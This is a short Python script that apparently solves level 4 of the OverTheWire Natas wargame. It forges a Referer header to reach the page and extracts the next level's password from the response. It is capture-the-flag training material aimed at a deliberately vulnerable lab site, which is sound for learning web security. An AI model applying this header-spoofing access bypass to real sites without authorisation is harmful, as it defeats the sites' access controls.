#! /usr/bin/python

import requests
import re

username = 'natas4'
password = ''

headers = {'Referer':'http://natas5.natas.labs.overthewire.org/'}

r = requests.get('http://natas4.natas.labs.overthewire.org/', auth=(username, password), headers=headers)
pattern = r'The password for natas5 is (\w+)'
result = re.search(pattern, str(r.content))

print result.group(1)
